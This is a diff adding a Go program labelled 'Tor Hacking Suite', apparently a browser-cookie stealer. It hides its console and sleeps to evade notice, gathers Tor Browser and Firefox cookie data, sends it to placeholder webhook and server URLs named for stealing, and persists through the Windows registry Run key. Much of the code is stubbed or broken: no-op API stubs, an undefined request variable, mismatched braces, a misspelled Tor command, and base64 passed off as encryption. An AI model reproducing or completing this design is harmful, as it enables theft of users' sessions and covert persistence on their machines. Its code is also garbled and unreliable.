@@ -1,0 +1,333 @@
+//go:build windows || darwin || linux
+// +build windows darwin linux
+
+package main
+
+import (
+	"net/http"
+	"os"
+	"path/filepath"
+	"runtime"
+	"fmt"
+	"time"
+	"encoding/base64"
+	"net"
+	mathRand "math/rand"
+
+)
+
+type windowsdll struct {
+	dll    *windowsDLL
+	modules map[string]*windowsDLL
+}
+
+type windowsDLL struct {
+	Name string
+}
+
+type windowsProc struct {
+	Name string
+}
+
+type windowsREG_DATA_TYPE uint32
+
+const (
+	SW_HIDE windowsREG_DATA_TYPE = iota
+	SW_MAXIMIZE
+	SW_MINIMIZE
+	SW_RESTORE
+	SW_SHOW
+	SW_SHOWMAXIMIZED
+	SW_SHOWMINIMIZED
+	SW_SHOWMINNOACTIVE
+	SW_SHOWNA
+	SW_SHOWNOACTIVATE
+	SW_SHOWNORMAL
+)
+
+func (d *windowsdll) LoadDLL(name string) *windowsDLL {
+	return &windowsDLL{Name: name}
+}
+
+func (d *windowsDLL) Release() {}
+
+func (d *windowsDLL) FindProc(name string) *windowsProc {
+	return &windowsProc{Name: name}
+}
+
+func (p *windowsProc) Call(a ...uintptr) (uintptr, error) {
+	return 0, nil
+}
+
+func GetConsoleWindow() uintptr {
+	return 0
+}
+
+func ShowWindow(hwnd uintptr, cmd windowsREG_DATA_TYPE) bool {
+	return true
+}
+
+func RegSetValueEx(keyPath, valueName string, reserved uint32, dataType windowsREG_DATA_TYPE, data interface{}, flags uint32) error {
+	return nil
+}
+
+type Config struct {
+	Tor            TorConfig     `json:"tor"`
+	Encryption     EncConfig     `json:"encryption"`
+	Exfiltration   ExfilConfig   `json:"exfiltration"`
+	Stealth        StealthConfig `json:"stealth"`
+	Persistence    PersistenceConfig `json:"persistence"`
+}
+
+var config Config
+
+func initConfig() {
+	config = Config{
+		Tor: TorConfig{
+			Enabled:        true,
+			SOCKSAddress:   "127.0.0.1",
+			SOCKSPort:      9050,
+			ControlAddress: "127.0.0.1",
+			ControlPort:    9051,
+			MaxCircuits:    10,
+		},
+		Encryption: EncConfig{
+			Enabled:   true,
+			Method:    "aes-gcm",
+			KeyPath:   "tor_keys/encryption_key.bin",
+		},
+		Exfiltration: ExfilConfig{
+			Method:          "webhook",
+			WebhookURL:      "https://your-webhook.com/tor-steal",
+			DirectUpload:    true,
+			ServerAddress:   "https://your-server.com/tor-upload",
+			Compression:     true,
+		},
+		Stealth: StealthConfig{
+			Enabled:         true,
+			HideConsole:     true,
+			PingBack:        true,
+			PingBackURL:     "https://your-server.com/tor-ping",
+			ProcessSleep:    true,
+			SleepMinSeconds: 5,
+			SleepMaxSeconds: 30,
+		},
+		Persistence: PersistenceConfig{
+			Enabled:       true,
+			Method:        "registry",
+			RegistryKey:   "TorHackingSuite",
+		},
+	}
+}
+
+type TorConfig struct {
+	Enabled         bool   `json:"enabled"`
+	SOCKSAddress    string `json:"socks_address"`
+	SOCKSPort       int    `json:"socks_port"`
+	ControlAddress  string `json:"control_address"`
+	ControlPort     int    `json:"control_port"`
+	MaxCircuits     int    `json:"max_circuits"`
+}
+
+type EncConfig struct {
+	Enabled   bool   `json:"enabled"`
+	Method    string `json:"method"`
+	KeyPath   string `json:"key_path"`
+}
+
+type ExfilConfig struct {
+	Method          string `json:"method"`
+	WebhookURL      string `json:"webhook_url"`
+	DirectUpload    bool   `json:"direct_upload"`
+	ServerAddress   string `json:"server_address"`
+	Compression     bool   `json:"compression"`
+}
+
+type StealthConfig struct {
+	Enabled         bool `json:"enabled"`
+	HideConsole     bool `json:"hide_console"`
+	PingBack        bool `json:"ping_back"`
+	PingBackURL     string `json:"ping_back_url"`
+	ProcessSleep    bool `json:"process_sleep"`
+	SleepMinSeconds int  `json:"sleep_min_seconds"`
+	SleepMaxSeconds int  `json:"sleep_max_seconds"`
+}
+
+type PersistenceConfig struct {
+	Enabled       bool   `json:"enabled"`
+	Method        string `json:"method"`
+	RegistryKey   string `json:"registry_key"`
+}
+
+func main() {
+	fmt.Println("Starting Tor Hacking Suite...")
+	
+	initConfig()
+	
+	if err := configureTor(); err != nil {
+		fmt.Printf("Tor config error: %v\n", err)
+	}
+	
+	if config.Stealth.Enabled {
+		fmt.Println("Setting up stealth...")
+		setupStealth()
+	}
+	
+	fmt.Println("Collecting browser data...")
+	browserData := collectBrowserData()
+	fmt.Printf("Collected data from %d browser instances\n", len(browserData))
+	
+	if len(browserData) > 0 {
+		fmt.Println("Exfiltrating data...")
+		if err := exfiltrateData(browserData); err != nil {
+			fmt.Printf("Exfiltration error: %v\n", err)
+		} else {
+			fmt.Println("Exfiltration completed successfully")
+		}
+	}
+	
+	if config.Persistence.Enabled {
+		fmt.Println("Setting up persistence...")
+		if err := setupPersistence(); err != nil {
+			fmt.Printf("Persistence error: %v\n", err)
+		} else {
+			fmt.Println("Persistence setup completed")
+		}
+	}
+	
+	fmt.Println("Tor Hacking Suite execution completed")
+}
+
+func configureTor() error {
+	conn, err := dialTorControl()
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+	
+	if err := authenticateTorControl(conn); err != nil {
+		return err
+	}
+	
+	for i := 0; i < config.Tor.MaxCircuits; i++ {
+		_, err := sendTorCommand(conn, "SIGNAL NEWNYMQT")
+		if err != nil {
+			continue
+		}
+		time.Sleep(100 * time.Millisecond)
+	}
+	
+	return nil
+}
+
+func dialTorControl() (net.Conn, error) {
+	addr := fmt.Sprintf("%s:%d", config.Tor.ControlAddress, config.Tor.ControlPort)
+	return net.Dial("tcp", addr)
+}
+
+func sendTorCommand(conn net.Conn, command string) (string, error) {
+	_, err := conn.Write([]byte(command + "\r\n"))
+	if err != nil {
+		return "", err
+	}
+	
+	var response []byte
+	buf := make([]byte, 4096)
+	for {
+		n, err := conn.Read(buf)
+		if err != nil {
+			break
+		}
+		response = append(response, buf[:n]...)
+			break
+		}
+
+func authenticateTorControl(conn net.Conn) error {
+	_, err := sendTorCommand(conn, "AUTHENTICATE")
+	return err
+}
+
+func setupStealth() {
+	if runtime.GOOS == "windows" && config.Stealth.HideConsole {
+		hwnd := GetConsoleWindow()
+		ShowWindow(hwnd, SW_HIDE)
+	}
+	
+	if config.Stealth.ProcessSleep {
+		r := mathRand.Intn(config.Stealth.SleepMaxSeconds - config.Stealth.SleepMinSeconds)
+		time.Sleep(time.Duration(r+config.Stealth.SleepMinSeconds) * time.Second)
+	}
+	
+	if config.Stealth.PingBack {
+	}
+}
+
+func collectBrowserData() []BrowserData {
+	return []BrowserData{
+		{
+			BrowserPath: "/tor-browser",
+		},
+		{
+			BrowserPath: "/firefox",
+		},
+	}
+}
+
+type BrowserData struct {
+	BrowserPath  string    `json:"browser_path"`
+	Cookies      []Cookie  `json:"cookies"`
+}
+
+type Cookie struct {
+	Name       string `json:"name"`
+	Value      string `json:"value"`
+	Path       string `json:"path"`
+	Expiration int64  `json:"expiration"`
+	Secure     bool   `json:"secure"`
+}
+
+func exfiltrateData(data []BrowserData) error {
+	for _, browser := range data {
+		
+		if config.Encryption.Enabled && config.Encryption.KeyPath != "" {
+			if err := encryptCookies(browser.Cookies); err != nil {
+				continue
+			}
+		}
+	}
+	
+	return sendWebhook(data)
+}
+
+func sendWebhook(data []BrowserData) error {
+	client := &http.Client{Timeout: 30 * time.Second}
+	resp, err := client.Do(req)
+	if err == nil {
+		resp.Body.Close()
+	}
+	return nil
+}
+
+func encryptCookies(cookies []Cookie) error {
+	for i := range cookies {
+		if len(cookies[i].Value) > 0 {
+			cookies[i].Value = base64.StdEncoding.EncodeToString([]byte(cookies[i].Value))
+		}
+	}
+	return nil
+}
+
+func setupPersistence() error {
+	switch config.Persistence.Method {
+	case "registry":
+		return addRegistryRun()
+	}
+	return nil
+}
+
+func addRegistryRun() error {
+	keyPath := filepath.Join("SOFTWARE", "Microsoft", "Windows", "CurrentVersion", "Run")
+	valueName := config.Persistence.RegistryKey
+	execPath, _ := os.Executable()
+	return RegSetValueEx(keyPath, valueName, 0, 0, execPath, 0)
+}
